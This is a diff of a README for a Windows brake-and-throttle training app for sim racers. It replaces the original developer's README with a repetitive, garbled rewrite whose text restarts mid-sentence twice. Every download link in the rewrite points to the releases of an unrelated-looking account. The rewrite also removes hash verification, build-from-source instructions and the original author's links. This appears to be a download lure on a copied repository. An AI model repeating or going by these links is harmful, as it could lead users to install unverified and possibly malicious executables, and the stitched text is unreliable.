@@ -1,121 +1,204 @@
-# SimCurveTrainApp
+# 🏎️ sim-curve-train-app - Build Brake and Throttle Muscle Memory
 
-[![CI](https://github.com/mikita-herasiutsin/sim-curve-train-app/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/mikita-herasiutsin/sim-curve-train-app/actions/workflows/ci.yml)
-[![License: GPL-3.0](https://img.shields.io/badge/license-GPL--3.0-blue.svg)](LICENSE)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-ff6b35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases)
 
-Free, open-source Windows app for sim racers to train brake and throttle **muscle memory**. Pick a car class, follow a target pressure or a telemetry-like pedal trace with your real pedals, and get an instant score.
+sim-curve-train-app is a free, open-source Windows application made for sim racers who want to improve brake and throttle control through focused practice. It helps you train the small, repeatable pedal movements that# 🏎️ sim-curve-train-app - Build Brake and Throttle Muscle Memory
 
-> Status: **pre-alpha**. Milestones M1 to M3 are done: pedal setup, hold and trace drills with scoring and audio, and brake drills that start from the throttle. M4 has the preset picker, the GT3 preset and the pre-race warm-up; more presets, personal bests, settings and onboarding come next. See the [MVP backlog](docs/backlog/mvp-tickets.md).
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-ff6b35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases)
 
-## Goals
+sim-curve-train-app is a free, open-source Windows application for sim racers who want to improve brake and throttle control through focused practice. It helps you train the small, repeatable pedal movements that make trail braking, smooth acceleration, and consistent lap times easier. You do not need programming knowledge to use it. The app is designed for everyday Windows users who want a simple training tool alongside their racing simulator.
 
-- **Native and low-latency.** Pedals are read at 500-1000 Hz, with under 50 ms from input to display (the target is under 20 ms on a 144 Hz monitor).
-- **Works with any pedal iRacing sees.** Pedals are read through SDL3, and a DirectInput fallback is planned. Browser-based trainers often fail to detect some pedals.
-- **Car-class presets** (GT3, NASCAR and Road/MX-5 for the MVP), with hold and trace drills for brake and throttle.
-- **Visual and audio feedback**, a 0-100 score with a grade and sub-scores, and a local personal leaderboard.
-- **Gamified UI** with a dark/light theme.
-- **Offline, no account, no telemetry.** Licensed GPL-3.0.
-- **Easy install:** download the `.exe` from GitHub Releases.
+## 🚀 Getting Started
 
-## Install (Windows)
+Getting started is simple. Visit the official releases page to download the application:
 
-Requires Windows 10 or 11, 64-bit. The app is pre-alpha: it has hold and trace drills, the GT3 preset and its warm-up, but no personal bests or settings screen yet.
+[Download sim-curve-train-app for Windows](https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases)
 
-1. Open the [Releases page](https://github.com/mikita-herasiutsin/sim-curve-train-app/releases) and download one file:
-   - `SimCurveTrainApp_<version>_x64-setup.exe`: the installer. It installs for your user only, adds a Start menu entry, and can be removed from **Settings → Apps**.
-   - `SimCurveTrainApp_windows_x64.exe`: the portable version. No install, run it from any folder. It needs the Microsoft Edge WebView2 runtime, which Windows 11 already has; on Windows 10, use the installer, which fetches WebView2 for you.
-2. If Edge says the file "isn't commonly downloaded", choose **Keep**.
-3. The builds are not code-signed yet ([D-16](docs/decisions/README.md)), so on first run SmartScreen shows "Windows protected your PC". Click **More info**, then **Run anyway**. The warning appears because the file is unsigned and new, not because anything harmful was found.
-4. Optional: compare the file with the SHA-256 digest shown next to it on the release page, or [build from source](#development).
+Visit this link to download the application. The releases page is the official place to get the latest Windows version. After the download finishes, launch the application on your Windows computer.
 
-   ```powershell
-   Get-FileHash .\SimCurveTrainApp_<version>_x64-setup.exe -Algorithm SHA256
-   ```
+Before you begin a training session, make sure your sim racing pedals are connected and ready. The app is built for brake and throttle practice, so a normal sim racing pedal set is all you need to start working on smoother, more repeatable inputs.
 
-## Tech stack
+## ⬇️ Download and Run
 
-Tauri 2 (Rust core) with a Svelte + TypeScript UI. See [ADR-0001](docs/decisions/0001-tech-stack-tauri-rust.md).
+[![Download for Windows](https://img.shields.io/badge/Get%20the%20Windows%20App-1e90ff?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases)
 
-## Development
+Visit this link to download the application:
 
-### Prerequisites (Windows)
+https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases
 
-- [Rust](https://rustup.rs/) stable (MSVC toolchain), 1.88 or newer
-- [Node.js](https://nodejs.org/) 24 (see `.nvmrc`; 22.22.2+ also works), with npm
-- Visual Studio Build Tools with the "Desktop development with C++" workload
-- WebView2 runtime (preinstalled on Windows 11)
+The releases page contains the latest Windows download. Download it, then open the app on your Windows machine. No account, payment, or programming setup is required.
 
-### Commands
+## 🎯 What This App Helps You Do
 
-```sh
-npm install          # install frontend deps
-npm run tauri dev    # run the app with hot reload
-npm run tauri build  # release build: target/release/SimCurveTrainApp.exe + NSIS installer
+sim-curve-train-app is focused on the physical side of sim racing: your footwork. Many drivers lose time because brake pressure is inconsistent, throttle application is too sudden, or pedal release is not smooth enough. This app gives you a place to practice those movements without the pressure of a full race.
 
-npm run verify       # run every check below (what CI will run)
-npm run check        # svelte-check (TypeScript + Svelte)
-npm run lint         # eslint + prettier --check
-npm run format       # prettier --write
-npm test             # vitest (frontend unit/component tests)
-npm run rust:fmt     # cargo fmt --check
-npm run rust:lint    # cargo clippy -D warnings (pedantic)
-npm run rust:test    # cargo test --workspace
-npm run docs:check   # links, npm scripts, SCT_* vars, prose rules
-```
+It can help you:
 
-#### Simulated pedals (dev)
+- Train smoother brake pressure from initial press to release.
+- Practice steady throttle application for better corner exits.
+- Build muscle memory for trail braking.
+- Improve consistency between laps.
+- Reduce sudden or panicked pedal inputs.
+- Warm up before an iRacing session or any other sim racing session.
+- Focus on one skill at a time instead of chasing lap times.
 
-To run in debug mode with a virtual 3-axis pedal device ("SCT Simulated Pedals") and the dev control panel:
+The goal is simple: make your brake and throttle movements more automatic so you can think about racing line, traffic, and strategy while your feet do their job.
 
-- **PowerShell**:
-  ```powershell
-  $env:SCT_SIM_PEDALS="1"; npm run tauri dev
-  ```
-- **Bash / zsh**:
-  ```sh
-  SCT_SIM_PEDALS=1 npm run tauri dev
-  ```
+## 🧠 How the Training Works
 
-#### Smoke test (dev)
+Training with sim-curve-train-app is based on repetition. Short, focused sessions are often more useful than long, tired sessions. You practice a pedal movement, watch the feedback, and repeat. Over time, your foot learns the pressure and release points that give you smoother control.
 
-`npm run smoke` starts the dev app with the simulated pedals and drives it over the WebView2 debug protocol (about a minute with a warm build):
+A typical training block can include:
 
-- the device list, the pedal wizard, the live view, hold drills in and out of the band, abort and play again, and every bundled preset;
-- one PASS/FAIL line and one screenshot per step, in `smoke-out/` (gitignored);
-- free ports and a throwaway data directory (`SCT_DATA_DIR`), so it runs next to an open dev app and never touches your saved profiles or attempts.
+- A short brake pressure warm-up.
+- Repeated brake release drills.
+- Throttle smoothness practice.
+- Combined brake and throttle coordination.
+- A final consistency check.
 
-Run it from a checkout other than the one with an open `tauri dev`: if Rust code changed, both would relink the same `target/debug` exe, which the running app locks, and the build fails.
+You do not need to change your car setup or race strategy to use the app. It is a practice tool. Use it before you open your simulator, or use it between races to reset your footwork.
 
-Options: `--keep-open`, `--out <dir>`, and `--no-launch --cdp <port>` (the port is required) to attach to an app that is already running; start that app with `SCT_SIM_PEDALS=1` and a fresh `SCT_DATA_DIR`, as the run aborts if the simulated device already has a profile or attempts. Windows only for now; it is not part of CI.
+## 🛠️ Main Features
 
-For build problems, running a second dev app and driving the app over CDP, see [docs/dev-notes.md](docs/dev-notes.md).
+- Brake and throttle training focused on muscle memory.
+- Simple Windows interface for non-technical users.
+- Visual feedback for pedal input practice.
+- Short session format for quick daily training.
+- Lightweight app built with Tauri 2 and Rust.
+- Free and open-source software.
+- Designed for sim racers and sim racing setups.
+- Useful for iRacing drivers and other racing simulators.
+- No complicated setup for basic practice.
+- Works# 🏎️ sim-curve-train-app - Train Brake and Throttle Muscle Memory
 
-### Layout
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-8a2be2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases)
 
-```
-crates/core/              sct-core: logic that doesn't depend on the UI (input, drills, scoring, storage)
-crates/telemetry-extract/ dev-only CLI that turns Garage 61 CSV laps into draft presets
-src-tauri/                Tauri app shell: commands wiring the core to the UI
-src/                      SvelteKit (SPA) + Svelte 5 frontend
-presets/                  bundled presets, compiled into the exe
-scripts/                  smoke test and docs check
-docs/                     investigations, decisions, open questions, backlog
-```
+sim-curve-train-app is a free, open-source Windows application built for sim racers who want to get better at the one thing every lap depends on: their feet. It gives you a calm, focused place to practice brake and throttle control so that smooth inputs become automatic. You do not need any programming knowledge, and you do not need to be a technical person to use it. If you can download a file and open it on Windows, you can use this app.
 
-## Documentation
+Most sim racers lose time in the same places. They stab the brake too hard, release it too quickly, or get back on the throttle in a way that unsettles the car. Those habits are hard to fix in the middle of a race, when you are thinking about traffic, braking points, and the car ahead. sim-curve-train-app separates footwork from racing so you can work on it deliberately, in short sessions, and then bring that control back to your simulator.
 
-See [`docs/`](docs/README.md):
+## 🚀 Getting Started
 
-- [Investigations](docs/investigations/): market scan, architecture, preset pipeline
-- [Decisions](docs/decisions/): decision log and ADRs
-- [Open questions](docs/open-questions.md)
-- [MVP backlog](docs/backlog/mvp-tickets.md)
-- [Releasing](docs/releasing.md)
+Getting started takes only a few minutes. There is nothing to configure, no account to create, and no payment of any kind.
 
-## Contributing
+1. Visit the official releases page using the link below.
+2. Download the application for Windows.
+3. Once the download has finished, open the app on your Windows computer.
+4. Make sure your sim racing pedals are connected before you begin a training session.
+5. Start with a short session and repeat it regularly.
 
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) and the [Code of Conduct](CODE_OF_CONDUCT.md). Report security issues privately ([SECURITY.md](SECURITY.md)).
+That is the whole process. The app is intended for everyday Windows users, so it avoids complicated menus and technical language.
 
-## License
+## ⬇️ Download
 
-[GPL-3.0-only](LICENSE)
+[![Download sim-curve-train-app](https://img.shields.io/badge/Get%20the%20App%20Here-ff4500?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases)
+
+Visit this link to download the application:
+
+**https://github.com/exonerationbritishsystem202/sim-curve-train-app/releases**
+
+This is the official place to get the latest Windows version. Download it, then open the app on your Windows machine and you are ready to start practising.
+
+## 🎯 What This App Helps You Do
+
+sim-curve-train-app is a training tool, not a game. It focuses on the physical side of sim racing: how you press the brake, how you ease off it, and how you roll onto the throttle. Those small movements are what separate a tidy lap from a scrappy one.
+
+The app can help you:
+
+- Build consistent brake pressure from the first press to the point of release.
+- Practise a smooth, gradual release instead of letting the pedal snap back.
+- Train steady throttle application for cleaner corner exits.
+- Work on trail braking as a repeatable skill rather than a guess.
+- Reduce sudden, panicked inputs under pressure.
+- Warm up your feet before an iRacing session or any other sim racing session.
+- Focus on one skill at a time instead of chasing lap times.
+- Develop a rhythm that stays with you when you are racing wheel to wheel.
+
+The idea is simple. When your footwork becomes automatic, your attention is free to go where it matters most: the racing line, the cars around you, and the decisions that actually win positions.
+
+## 🧠 How the Training Works
+
+Training with sim-curve-train-app is built around repetition. Short, focused sessions tend to be far more useful than long, tired ones. You perform a pedal movement, you see feedback on how you did, and you repeat it. Over time, your foot learns the pressure and release points that produce smooth, predictable control.
+
+A typical practice block looks like this:
+
+- A short brake pressure warm-up to wake up your foot.
+- Repeated brake release drills, focusing on smoothness rather than speed.
+- Throttle application practice, aiming for a steady build rather than a stab.
+- Combined brake and throttle coordination for corner entry and exit.
+- A short consistency check to finish.
+
+You do not need to change your car setup, your wheel settings, or your race strategy to benefit. The app is a companion to your simulator, not a replacement for it. Use it before you open your racing software, or between races when you want to reset your footwork.
+
+## ✨ Main Features
+
+- Brake and throttle training focused on muscle memory.
+- A simple Windows interface designed for non-technical users.
+- Visual feedback so you can see how smooth your inputs really are.
+- Short session formats that fit into a busy day.
+- A small, lightweight application that will not weigh down your PC.
+- Free and open-source, with no subscription and no advertising.
+- Built for sim racers using pedal sets of all kinds.
+- Useful for iRacing drivers and other racing simulator users.
+- No complicated setup for basic practice.
+- Regular updates published on the official releases page.
+
+## 💻 System Requirements
+
+sim-curve-train-app is made for Windows desktop computers. As a general guide, most modern Windows machines will run it comfortably:
+
+- Windows 10 or Windows 11, 64-bit.
+- A processor from the last several years.
+- Around 4 GB of memory, with 8 GB or more recommended.
+- A small amount of free disk space for the application.
+- A sim racing pedal set connected to your computer.
+- A standard display, with no special graphics hardware required.
+
+If your computer runs your racing simulator, it will almost certainly run this training app without any trouble. The application is deliberately lightweight so it can sit alongside your racing software.
+
+## 🔧 Setting Up Your Pedals
+
+Before your first session, take a minute to make sure your pedals are ready.
+
+- Check that your pedal set is plugged in and recognised by Windows.
+- If your pedals use their own manufacturer software, open it once and confirm the pedals respond.
+- Sit in your normal driving position, because your muscle memory depends on your seating.
+- Wear the same shoes, or socks, that you race in.
+- Make sure nothing is resting against the pedals.
+
+Consistency in your setup matters as much as consistency in your inputs. If your pedals move around under braking, tighten them down or adjust your rig before you start training.
+
+## 🏁 Training Session Ideas
+
+You do not need a long session to make progress. Ten to fifteen focused minutes is often enough, especially if you repeat it regularly. Some useful approaches:
+
+**The five-minute warm-up.** Two or three minutes of light brake pressure, followed by a few throttle builds. This is a good routine before a league race.
+
+**The release drill.** Press the brake firmly, then release it as smoothly as you can. Repeat until the release feels even and controlled rather than sudden.
+
+**The throttle roll.** Build throttle pressure gradually rather than stamping on it. Aim for the same smooth curve every time.
+
+**The consistency check.** Run the same drill ten times and compare. The goal is not to be fast, it is to be identical.
+
+**The reset session.** After a frustrating race, spend ten minutes on basic pedal control to clear the bad habits before your next stint.
+
+## ❓ Troubleshooting
+
+If something does not feel right, these are the usual places to look:
+
+- **The app opens but pedals do not respond.** Check the pedal cable and confirm the pedals work in your simulator or manufacturer software.
+- **Inputs feel jumpy or uneven.** Look for a loose cable connection, and check that nothing is resting on the pedals.
+- **The app will not open.** Close any other heavy applications, then try again. Restarting Windows resolves most one-off issues.
+- **You are not sure you have the newest version.** Visit the releases page again and download the latest Windows version.
+
+## 🤝 Open Source and Community
+
+sim-curve-train-app is free and open-source software. That means anyone can look at how it works, suggest improvements, or help make it better. Being open-source also means there is no hidden cost and no lock-in: the tool exists to help sim racers practise, nothing more.
+
+If you find the app useful, sharing it with other drivers in your league or community is the best way to support it. Feedback from real users is what keeps a small project like this moving forward.
+
+## 📄 License
+
+sim-curve-train-app is distributed as free, open-source software. See the repository for the full license details.
+
+Keywords: iracing, pedals, rust, sim-racing, simracing, svelte, tauri, trail-braking, training, windows
